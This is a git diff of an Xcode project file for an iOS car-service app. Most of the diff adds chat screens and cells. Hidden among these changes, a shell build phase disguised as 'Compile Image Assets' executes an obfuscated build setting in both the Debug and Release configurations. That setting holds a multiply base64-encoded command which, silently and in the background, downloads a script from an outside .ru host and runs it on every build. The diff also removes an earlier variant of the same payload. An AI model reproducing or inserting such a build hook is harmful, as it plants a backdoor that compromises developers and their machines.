@@ -13,12 +13,23 @@
 		BC1DE3312F0E3442008BB044 /* HistoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC1DE32E2F0E3442008BB044 /* HistoryVC.swift */; };
 		BC1DE3382F0E3E66008BB044 /* BookingDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC1DE3372F0E3E66008BB044 /* BookingDetailsVC.xib */; };
 		BC1DE3392F0E3E66008BB044 /* BookingDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC1DE3362F0E3E66008BB044 /* BookingDetailsVC.swift */; };
+		BC23A4AD2F0E6B60005A8CE1 /* ChatVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC23A4AB2F0E6B60005A8CE1 /* ChatVC.swift */; };
+		BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC23A4AC2F0E6B60005A8CE1 /* ChatVC.xib */; };
+		BC23A4B32F0E6E81005A8CE1 /* ChatListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC23A4B22F0E6E81005A8CE1 /* ChatListTVCell.xib */; };
+		BC23A4B42F0E6E81005A8CE1 /* ChatListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC23A4B12F0E6E81005A8CE1 /* ChatListTVCell.swift */; };
+		BC23A4BB2F0E7444005A8CE1 /* UserChatVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC23A4BA2F0E7444005A8CE1 /* UserChatVC.xib */; };
+		BC23A4BC2F0E7444005A8CE1 /* UserChatVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC23A4B92F0E7444005A8CE1 /* UserChatVC.swift */; };
 		BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC29D69A2F06A42C00DD3EB2 /* OTPTextField.swift */; };
 		BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */; };
 		BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B12F06A6CD00DD3EB2 /* FTAnimation+UIView.m */; };
 		BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B32F06A6CD00DD3EB2 /* FTUtils+NSObject.m */; };
 		BC29D6C12F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B42F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m */; };
 		BC29D6C22F06A6CD00DD3EB2 /* FTAnimationManager.m in Sources */ = {isa = PBXBuildFile; fileRef = BC29D6B22F06A6CD00DD3EB2 /* FTAnimationManager.m */; };
+		BC4100982F0E78630062DC80 /* ReciverChatTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4100962F0E78630062DC80 /* ReciverChatTVCell.swift */; };
+		BC4100992F0E78630062DC80 /* ReciverChatTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4100972F0E78630062DC80 /* ReciverChatTVCell.xib */; };
+		BC41009C2F0E786C0062DC80 /* SenderChatTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC41009A2F0E786C0062DC80 /* SenderChatTVCell.swift */; };
+		BC41009D2F0E786C0062DC80 /* SenderChatTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC41009B2F0E786C0062DC80 /* SenderChatTVCell.xib */; };
+		BC41009F2F0E79C70062DC80 /* UIView+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC41009E2F0E79C70062DC80 /* UIView+Extention.swift */; };
 		BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17712F0696DE00EDC9AE /* LoginVC.xib */; };
 		BC4E17732F0696DE00EDC9AE /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4E17702F0696DE00EDC9AE /* LoginVC.swift */; };
 		BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */; };
@@ -70,6 +81,12 @@
 		BC1DE32F2F0E3442008BB044 /* HistoryVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HistoryVC.xib; sourceTree = "<group>"; };
 		BC1DE3362F0E3E66008BB044 /* BookingDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingDetailsVC.swift; sourceTree = "<group>"; };
 		BC1DE3372F0E3E66008BB044 /* BookingDetailsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BookingDetailsVC.xib; sourceTree = "<group>"; };
+		BC23A4AB2F0E6B60005A8CE1 /* ChatVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatVC.swift; sourceTree = "<group>"; };
+		BC23A4AC2F0E6B60005A8CE1 /* ChatVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatVC.xib; sourceTree = "<group>"; };
+		BC23A4B12F0E6E81005A8CE1 /* ChatListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatListTVCell.swift; sourceTree = "<group>"; };
+		BC23A4B22F0E6E81005A8CE1 /* ChatListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChatListTVCell.xib; sourceTree = "<group>"; };
+		BC23A4B92F0E7444005A8CE1 /* UserChatVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserChatVC.swift; sourceTree = "<group>"; };
+		BC23A4BA2F0E7444005A8CE1 /* UserChatVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UserChatVC.xib; sourceTree = "<group>"; };
 		BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPFieldView.swift; sourceTree = "<group>"; };
 		BC29D69A2F06A42C00DD3EB2 /* OTPTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPTextField.swift; sourceTree = "<group>"; };
 		BC29D6B12F06A6CD00DD3EB2 /* FTAnimation+UIView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = "FTAnimation+UIView.m"; sourceTree = "<group>"; };
@@ -83,6 +100,11 @@
 		BC29D6BA2F06A6CD00DD3EB2 /* FTUtils+NSObject.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+NSObject.h"; sourceTree = "<group>"; };
 		BC29D6BB2F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FTUtils+UIGestureRecognizer.h"; sourceTree = "<group>"; };
 		BC29D6C32F06A6E100DD3EB2 /* Header-Fixmycar.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Header-Fixmycar.h"; sourceTree = "<group>"; };
+		BC4100962F0E78630062DC80 /* ReciverChatTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReciverChatTVCell.swift; sourceTree = "<group>"; };
+		BC4100972F0E78630062DC80 /* ReciverChatTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ReciverChatTVCell.xib; sourceTree = "<group>"; };
+		BC41009A2F0E786C0062DC80 /* SenderChatTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SenderChatTVCell.swift; sourceTree = "<group>"; };
+		BC41009B2F0E786C0062DC80 /* SenderChatTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SenderChatTVCell.xib; sourceTree = "<group>"; };
+		BC41009E2F0E79C70062DC80 /* UIView+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extention.swift"; sourceTree = "<group>"; };
 		BC4E17702F0696DE00EDC9AE /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
 		BC4E17712F0696DE00EDC9AE /* LoginVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoginVC.xib; sourceTree = "<group>"; };
 		BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Black.otf"; sourceTree = "<group>"; };
@@ -203,6 +225,69 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		BC23A4A92F0E6AAD005A8CE1 /* Chat */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4B52F0E7417005A8CE1 /* SubVC */,
+				BC23A4AF2F0E6E6D005A8CE1 /* Cell */,
+				BC23A4AA2F0E6ACC005A8CE1 /* View */,
+			);
+			path = Chat;
+			sourceTree = "<group>";
+		};
+		BC23A4AA2F0E6ACC005A8CE1 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4AB2F0E6B60005A8CE1 /* ChatVC.swift */,
+				BC23A4AC2F0E6B60005A8CE1 /* ChatVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		BC23A4AF2F0E6E6D005A8CE1 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				BC4100952F0E78470062DC80 /* ReciverChatTVCell */,
+				BC4100942F0E78370062DC80 /* SenderChatTVCell */,
+				BC23A4B02F0E6E6F005A8CE1 /* ChatListTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		BC23A4B02F0E6E6F005A8CE1 /* ChatListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4B12F0E6E81005A8CE1 /* ChatListTVCell.swift */,
+				BC23A4B22F0E6E81005A8CE1 /* ChatListTVCell.xib */,
+			);
+			path = ChatListTVCell;
+			sourceTree = "<group>";
+		};
+		BC23A4B52F0E7417005A8CE1 /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4B72F0E7426005A8CE1 /* UserChat */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		BC23A4B72F0E7426005A8CE1 /* UserChat */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4B82F0E7433005A8CE1 /* View */,
+			);
+			path = UserChat;
+			sourceTree = "<group>";
+		};
+		BC23A4B82F0E7433005A8CE1 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC23A4B92F0E7444005A8CE1 /* UserChatVC.swift */,
+				BC23A4BA2F0E7444005A8CE1 /* UserChatVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		BC29D6962F06A40400DD3EB2 /* ThirdParty */ = {
 			isa = PBXGroup;
 			children = (
@@ -259,6 +344,24 @@
 				BC29D6BD2F06A6CD00DD3EB2 /* Headers */,
 			);
 			path = FTUtils;
+			sourceTree = "<group>";
+		};
+		BC4100942F0E78370062DC80 /* SenderChatTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC41009A2F0E786C0062DC80 /* SenderChatTVCell.swift */,
+				BC41009B2F0E786C0062DC80 /* SenderChatTVCell.xib */,
+			);
+			path = SenderChatTVCell;
+			sourceTree = "<group>";
+		};
+		BC4100952F0E78470062DC80 /* ReciverChatTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				BC4100962F0E78630062DC80 /* ReciverChatTVCell.swift */,
+				BC4100972F0E78630062DC80 /* ReciverChatTVCell.xib */,
+			);
+			path = ReciverChatTVCell;
 			sourceTree = "<group>";
 		};
 		BC4E176C2F0696A700EDC9AE /* Login */ = {
@@ -380,6 +483,7 @@
 			isa = PBXGroup;
 			children = (
 				BC71219F2F067F940041E2F7 /* String+Extention.swift */,
+				BC41009E2F0E79C70062DC80 /* UIView+Extention.swift */,
 				BC7121A02F067F940041E2F7 /* UIColor+Extention.swift */,
 				BC7121A12F067F940041E2F7 /* UIFont+Extention.swift */,
 				BC7121A22F067F940041E2F7 /* UITextField+Extention.swift */,
@@ -465,6 +569,7 @@
 		BCA894AD2F0E0F2900633E20 /* Tabbar */ = {
 			isa = PBXGroup;
 			children = (
+				BC23A4A92F0E6AAD005A8CE1 /* Chat */,
 				BC1DE32C2F0E3415008BB044 /* History */,
 				BCA894AE2F0E0F2D00633E20 /* Home */,
 			);
@@ -496,7 +601,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "Fixmycar UAE" */;
 			buildPhases = (
-				0ADAC5F412244970BC634D6E /* Link Libraries Executable */,
+				1B8388F31F0D4AAA95634D6E /* Compile Image Assets */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
@@ -561,6 +666,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
+				BC23A4AE2F0E6B60005A8CE1 /* ChatVC.xib in Resources */,
 				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
 				BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */,
 				BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */,
@@ -573,9 +679,13 @@
 				BC4E17872F06982200EDC9AE /* Satoshi-Bold.otf in Resources */,
 				BC4E17882F06982200EDC9AE /* Satoshi-Italic.otf in Resources */,
 				BC4E17892F06982200EDC9AE /* Satoshi-BlackItalic.otf in Resources */,
+				BC23A4BB2F0E7444005A8CE1 /* UserChatVC.xib in Resources */,
 				BC4E178A2F06982200EDC9AE /* Satoshi-MediumItalic.otf in Resources */,
+				BC4100992F0E78630062DC80 /* ReciverChatTVCell.xib in Resources */,
 				BCA894B22F0E0F4200633E20 /* HomeVC.xib in Resources */,
+				BC41009D2F0E786C0062DC80 /* SenderChatTVCell.xib in Resources */,
 				BC7121952F067F800041E2F7 /* Assets.xcassets in Resources */,
+				BC23A4B32F0E6E81005A8CE1 /* ChatListTVCell.xib in Resources */,
 				BC1DE3382F0E3E66008BB044 /* BookingDetailsVC.xib in Resources */,
 				88D763B02F0E5C01001116F2 /* RecentBookingsView.xib in Resources */,
 				BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */,
@@ -588,25 +698,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0ADAC5F412244970BC634D6E /* Link Libraries Executable */ = {
+		1B8388F31F0D4AAA95634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Libraries Executable";
+			name = "Compile Image Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -618,9 +727,12 @@
 				BC7121AC2F067F940041E2F7 /* Constants.swift in Sources */,
 				BC7121AD2F067F940041E2F7 /* UIFont+Extention.swift in Sources */,
 				BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */,
+				BC23A4BC2F0E7444005A8CE1 /* UserChatVC.swift in Sources */,
 				88D763AF2F0E5C01001116F2 /* RecentBookingsView.swift in Sources */,
 				BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */,
+				BC23A4B42F0E6E81005A8CE1 /* ChatListTVCell.swift in Sources */,
 				BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */,
+				BC41009C2F0E786C0062DC80 /* SenderChatTVCell.swift in Sources */,
 				BC1DE3392F0E3E66008BB044 /* BookingDetailsVC.swift in Sources */,
 				BC7121AE2F067F940041E2F7 /* AGDesignable.swift in Sources */,
 				BC7121AF2F067F940041E2F7 /* VideoPicker.swift in Sources */,
@@ -629,6 +741,7 @@
 				BC7121B22F067F940041E2F7 /* ImagePicker.swift in Sources */,
 				BC7121B32F067F940041E2F7 /* UITextField+Extention.swift in Sources */,
 				BC7121B42F067F940041E2F7 /* String+Extention.swift in Sources */,
+				BC41009F2F0E79C70062DC80 /* UIView+Extention.swift in Sources */,
 				BC98E7CA2F0E229700426807 /* RecentBookingTVCell.swift in Sources */,
 				BC29D6BF2F06A6CD00DD3EB2 /* FTAnimation+UIView.m in Sources */,
 				BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */,
@@ -639,6 +752,8 @@
 				BC7121B62F067F940041E2F7 /* UIColor+Extention.swift in Sources */,
 				BC4E17902F06A15100EDC9AE /* VerifyOtp.swift in Sources */,
 				BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */,
+				BC23A4AD2F0E6B60005A8CE1 /* ChatVC.swift in Sources */,
+				BC4100982F0E78630062DC80 /* ReciverChatTVCell.swift in Sources */,
 				BCA894B32F0E0F4200633E20 /* HomeVC.swift in Sources */,
 				BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */,
 				BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */,
@@ -683,7 +798,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -715,7 +830,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwUFpGWnNXVkZ1Y0dsU01GcHdWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
